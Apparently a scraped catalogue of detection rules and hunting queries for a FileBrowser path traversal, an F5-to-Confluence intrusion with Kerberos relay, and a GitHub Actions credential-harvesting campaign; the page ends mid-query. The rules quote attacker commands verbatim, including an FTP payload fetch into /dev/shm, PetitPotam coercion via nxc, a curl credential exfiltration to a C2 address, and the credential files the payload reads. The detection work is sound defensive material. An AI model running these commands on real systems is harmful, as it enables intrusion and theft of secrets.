[LLM] FileBrowser Quantum public share PATCH path traversal in fromPath/toPath (GHSA-qqqm-5547-774x) Exploitation High
Detects exploitation of the unauthenticated path traversal in FileBrowser Quantum's publicPatchHandler. Targets HTTP PATCH requests to /public/api/resources?hash=<share-hash> whose JSON body contains '..' segments in the fromPath or toPath fields — the exact pattern that escapes the share root before SanitizeUserPath runs. Rationale: Pivots on the verbatim exploit-request shape from the advisory: HTTP PATCH against /public/api/resources with hash= query string, where the JSON body contains a fromPath or toPath value beginning with '..'. Confirmed against the GitLab Advisories writeup of the sibling CVE-2026-44542 (same handler family, same root-cause sanitize-after-join pattern). Defender/Falcon left empty because EDR telemetry does not include HTTP request bodies — this is exclusively a WAF/web-proxy detection. Cross-checked: https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/, https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://nvd.nist.gov/vuln/detail/CVE-2026-44542, https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/ • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://nvd.nist.gov/vuln/detail/CVE-2026-44542 • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design

[LLM] Volumetric PATCH probing against FileBrowser Quantum public share endpoint Reconnaissance Medium
Catches automated path-traversal probing where one source IP issues many PATCH requests with varying body shapes against /public/api/resources?hash=<hash> in a short window. Targets attacker tooling enumerating share hashes or fuzzing fromPath/toPath values for the GHSA-qqqm-5547-774x bug — distinct from a single legitimate rename operation. Rationale: A single legitimate user renaming a file via a public share generates one PATCH; an attacker fuzzing fromPath/toPath payloads or enumerating share hashes generates many in a tight window. Threshold pivots: ≥10 PATCHes from one IP in 5 min, OR ≥3 distinct hash= values from one IP in 5 min. Datadog query is the raw filter — the count/groupBy threshold is set at rule level per the Datadog Cloud SIEM model. Defender/Falcon empty because HTTP telemetry isn't on the EDR. Cross-checked: https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://github.com/gtsteffaniak/filebrowser/releases. Cross-checked against: • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://github.com/gtsteffaniak/filebrowser/releases • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design
ATT&CKT1190 T1595.002
Data sourcesWeb.All_Web
let WindowMin = 5m;
let PatchThreshold = 10;
let HashThreshold = 3;
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL contains "/public/api/resources"
| extend ShareHash = extract(@"(?i)[?&]hash=([A-Za-z0-9_-]+)", 1, RequestURL)
| summarize PatchCount = count(),
            UniqueHashes = dcount(ShareHash),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated),
            UserAgents = make_set(RequestClientApplication, 25),
            StatusCodes = make_set(EventOutcome, 25)
            by SourceIP, DeviceVendor, DeviceProduct, bin(TimeGenerated, WindowMin)
| where PatchCount >= PatchThreshold or UniqueHashes >= HashThreshold
| extend ProbeSignal = case(UniqueHashes >= HashThreshold and PatchCount >= PatchThreshold, "hash_enumeration",
                            PatchCount >= 20, "single_hash_fuzzing",
                            "elevated")
| order by PatchCount desc
source:(nginx OR caddy OR apache OR aws.waf OR cloudflare OR azure.appgw) @http.method:PATCH @http.url:*\/public\/api\/resources*

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence

Microsoft Security Blog
2026-05-22 15 use cases 17 techniques 6 kill-chain phases detected

A multi-stage attack on Linux devices began with an exposed F5 BIG-IP edge appliance and pivoted to an internal Confluence server for credential theft and identity compromise. Learn how the threat actor attempted Kerberos relay and lateral movement, and how Microsoft Defender detected, blocked, and unraveled the attack. The post From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence appeared first on Microsoft Security Blog .

[LLM] Linux wget/curl fetching HackTool:Linux/MalPack.B from 206.189.27.39:8888 Delivery High
Detects wget or curl invocations from a Linux host reaching the Microsoft-reported staging IP 206.189.27.39 on port 8888 (path /5), used to deliver the custom scanning tool (SHA256 4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465) classified by Defender as HackTool:Linux/MalPack.B. Rationale: Anchors on the exact IP literal 206.189.27.39 from Microsoft's IOC list and the wget/curl downloader pattern shown verbatim in Block 2. Cross-checked with Microsoft Security Intelligence HackTool:Linux/MalPack.B family page. Cross-checked against: • https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool%3ALinux%2FMalPack.B&ThreatID=2147926274

[LLM] Linux curl FTP fetch writing payload into /dev/shm (tmpfs staging) Installation High
Detects curl invocations that fetch over ftp:// and write the output into /dev/shm/* — the exact pattern Microsoft observed when the actor bypassed Confluence host-level write blocks by serving a custom scanner over a Python ftplib FTP server and pulling it into shared memory. Rationale: Anchors on Block 3 verbatim: `curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5`. The ftp:// + /dev/shm/ combination is extremely rare in benign Linux ops — almost no legitimate package or admin tooling uses anonymous FTP into tmpfs.
ATT&CKT1105 T1564.001

| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc

[LLM] Confluence credential file access (server.xml / confluence.cfg.xml) by non-Confluence process Actions on Objectives High
Detects any process reading /opt/atlassian/confluence/conf/server.xml or /var/atlassian/application-data/confluence/confluence.cfg.xml where the actor is not Tomcat/Confluence itself. Microsoft observed the actor pulling DB credentials and JIRA service account creds from these two files after RCE, then using them for NTLM/Kerberos relay against AD. Rationale: Anchors on the two exact file paths Microsoft cites: `/opt/atlassian/confluence/conf/server.xml` and `/var/atlassian/application-data/confluence/confluence.cfg.xml`. These files store Confluence's DB connection strings (often containing the JiraServices/atlassian service account passwords later relayed against AD).

[LLM] NetExec/nxc PetitPotam coerce_plus with marshalled-target SMB payload Exploitation High
Detects invocation of NetExec (nxc) using the coerce_plus -M module with PetitPotam and the marshalled SPN target string (`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) — the exact authentication-coercion technique Microsoft observed prior to the CVE-2025-33073 relay. Rationale: Anchors on the verbatim NetExec command line from the article: `nxc smb [IP] -d ... -u Jiraservices -p '...' -M coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAA..."`. The marshalled-target string `localhost1UWhRC` is the signature of CVE-2025-33073-style SPN spoofing — corroborated by BreakPoint Labs writeup of the exploit primitive. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/
ATT&CKT1187 T1557.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (FileName in~ ("nxc","netexec") and ProcessCommandLine has "-M ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (ActingProcessName endswith "/nxc" or ActingProcessName endswith "/netexec")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName

[LLM] CVE-2025-33073 Reflective Kerberos Relay exploit script + dnstool DNS record injection Exploitation High
Detects execution of the public CVE-2025-33073 exploit (CVE-2025-33073.py) and/or krbrelayx's dnstool.py being used to add a DNS record containing the marshalled SPN string — the two-step combo Microsoft observed for the Kerberos reflection attack against an unpatched DC/member server. Rationale: Anchors on the literal `CVE-2025-33073.py` filename and `dnstool.py ... -a add -r localhost1UWhRCAAAA...` shown verbatim in the article. The marshalled-target SPN combined with DNS record add is the published exploit primitive — confirmed against BreakPoint Labs and SySS reflective-Kerberos writeups. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/ • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073

[LLM] gowitness HTTP/HTTPS recon scan with Chrome SOCKS5 proxy on internal subnet Reconnaissance Medium
Detects execution of the `gowitness` web-screenshot tool (SHA256 57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517) with the article-specific argument pattern: `scan nmap`, `--write-screenshots`, `--screenshot-fullpage`, `--chrome-proxy socks5://`. Microsoft observed this as the actor's web-app inventory step before identifying the vulnerable Confluence server. Rationale: Anchors on Block 1 verbatim (`gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-fullpage --open-only --service-contains http --delay 5 --threads 1 --chrome-proxy socks5://127.0.0.1:9090`) and the article-supplied SHA256 hash 57b3188e... for the gowitness binary the actor staged. The SOCKS5 proxy on 127.0.0.1:9090 is the actor's pivot for visiting internal web apps via the staging host.
ATT&CKT1595.002 T1046
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName =~ "gowitness" or InitiatingProcessFileName =~ "gowitness" or ProcessCommandLine has "gowitness scan nmap")
   or (ProcessCommandLine has_all ("--write-screenshots","--chrome-proxy","socks5://"))
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName endswith "/gowitness" or ActingProcessName =~ "gowitness"
   or ActingProcessCommandLine has "gowitness scan nmap"
   or (ActingProcessCommandLine has "--write-screenshots" and ActingProcessCommandLine has "socks5://" and ActingProcessCommandLine has "--chrome-proxy")
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, SHA256, ParentProcessName

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |

    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/

    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

A forged commit. A workflow file disguised as a routine CI optimization. Within 6 hours, 5,561 GitHub repositories were backdoored. Cloud credentials harvested. SSH keys stolen. OIDC tokens minted and exfiltrated before any runner finished. The attacker never touched your application code, only your pipeline. Most repositories had no idea it happened.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Megalodon backdoor workflow file (SysDiag.yml / Optimize-Build.yml) written to .github/workflows/ · File hash IOCs — endpoint file/process match · Article-specific behavioural hunt — Megalodon: Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Reposito
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Megalodon CI/CD exfil: outbound HTTPS to C2 216.126.225.129:8443 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Megalodon harvester: curl POST to C2 /collect endpoint on Linux runner · [LLM] Megalodon harvester: bash secret-grep across workspace (API_KEY|SECRET|TOKEN|PRIVATE_KEY|BEGIN RSA) · [LLM] Megalodon harvester: clustered read of ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json in one session · OAuth consent / suspicious app grant
[LLM] Megalodon CI/CD exfil: outbound HTTPS to C2 216.126.225.129:8443 Command & Control High
Detects any host (corporate proxy, EDR-monitored endpoint, self-hosted GitHub Actions runner) initiating a connection to the Megalodon campaign C2 server. The IP/port pair is unique to this campaign and any hit is a near-certain compromise indicator across the org. Rationale: Anchors on the article-published C2 IP 216.126.225.129 — a single hard IOC that StepSecurity attributes directly to the Megalodon campaign. The IP/port combo is not associated with any legitimate service in the article and any internal egress is high-fidelity.
ATT&CKT1041 T1567 T1071.001
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP == "216.126.225.129"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where DestinationIP == "216.126.225.129"
   | project TimeGenerated, Vendor=DeviceVendor, SourceIP, SourceHostName, DestinationIP, DestinationPort, RequestURL, DeviceAction),
  (ImNetworkSession
   | where TimeGenerated > ago(7d)
   | where DstIpAddr == "216.126.225.129"
   | project TimeGenerated, Vendor=EventVendor, SourceIP=SrcIpAddr, SourceHostName=SrcHostname, DestinationIP=DstIpAddr, DestinationPort=DstPortNumber, RequestURL=Url, DeviceAction=DvcAction)
| order by TimeGenerated desc

[LLM] Megalodon harvester: curl POST to C2 /collect endpoint on Linux runner Actions on Objectives High
Detects the runtime exfil step of the Megalodon payload — a curl invocation POSTing gzipped credential blob to https://216.126.225.129:8443/collect. Catches both self-hosted runners and any Linux/Windows host re-executing the decoded payload. Rationale: Pivots on the verbatim exfil command in the article — curl POST to https://216.126.225.129:8443/collect with --data-binary. Combining curl binary + IP + /collect path makes a near-zero-FP detection that catches the payload even if the decoded bash is split across multiple invocations.
ATT&CKT1567.002 T1041 T1059.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "curl" or FileName =~ "curl.exe" or FolderPath endswith "/curl"
| where ProcessCommandLine has "216.126.225.129" and ProcessCommandLine has "/collect"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "curl" or ActingProcessName endswith "curl.exe"
| where ActingProcessCommandLine has "216.126.225.129" and ActingProcessCommandLine has "/collect"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

[LLM] Megalodon harvester: bash secret-grep across workspace (API_KEY|SECRET|TOKEN|PRIVATE_KEY|BEGIN RSA) Actions on Objectives Medium
Detects the recursive secret-scrape step of the Megalodon payload — `grep -rE "(API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY|BEGIN RSA)"` walking the CI checkout looking for hardcoded secrets. The literal token list is the article-published payload string. Rationale: All six tokens (API_KEY, SECRET, TOKEN, PASSWORD, PRIVATE_KEY, BEGIN RSA) appear verbatim in the published bash payload's grep regex. Requiring all six together discriminates Megalodon from generic secret-scanners (gitleaks/trufflehog use their own ruleset, not raw greps with this exact token list).
ATT&CKT1552.001 T1083
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "grep" or FolderPath endswith "/grep"
| where ProcessCommandLine has_all ("API_KEY", "SECRET", "TOKEN", "PASSWORD", "PRIVATE_KEY", "BEGIN RSA")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "grep"
| where ActingProcessCommandLine has_all ("API_KEY", "SECRET", "TOKEN", "PASSWORD", "PRIVATE_KEY", "BEGIN RSA")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

[LLM] Megalodon backdoor workflow file (SysDiag.yml / Optimize-Build.yml) written to .github/workflows/ Installation High
Detects creation of a workflow file with one of the two campaign-specific filenames inside any .github/workflows/ directory. Catches developer workstations that cloned/pulled a poisoned repository as well as self-hosted runners checking out the malicious tree. Rationale: Both filenames (SysDiag.yml, Optimize-Build.yml) and the `name:` field values SysDiag / Optimize-Build are called out as the two campaign variants in the article and the recommended GitHub code search anchors. The path scope (.github/workflows/) plus exact filename match make this near-zero-FP.
ATT&CKT1195.002 T1554
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(14d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has ".github\\workflows" or FolderPath has ".github/workflows"
| where FileName in~ ("SysDiag.yml","Optimize-Build.yml")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFilePath has ".github/workflows" or TargetFilePath has ".github\\workflows"
| where TargetFileName in~ ("SysDiag.yml","Optimize-Build.yml")
| project TimeGenerated, DvcHostname, EventType, TargetFilePath, TargetFileName, ActorUsername, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

[LLM] Megalodon harvester: clustered read of ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json in one session Actions on Objectives Medium
Detects the credential-collection fan-out pattern — a single process tree reading multiple distinct credential stores (SSH private key, kube config, npm token, Docker registry creds) within a one-minute window. Catches Megalodon even if the bash one-liner is split into separate cat invocations and the C2 IP is not yet contactable. Rationale: Anchors directly on the article's decoded payload (Code blocks 2 and 3) — the exact targets cat'd by the Megalodon harvester: /proc/1/environ, ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json. Requiring ≥3 distinct targets from the same parent within 1 minute discriminates from any single legitimate dotfile-reading tool.
ATT&CKT1552.001 T1552.004 T1555
Data sourcesEndpoint.Processes
let LookbackDays = 7d;
let WindowMin = 1m;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where FileName =~ "cat" or FolderPath endswith "/cat"
| where ProcessCommandLine has_any ("/proc/1/environ","/.ssh/id_","/.kube/config","/.npmrc","/.docker/config.json")
| extend Target = case(
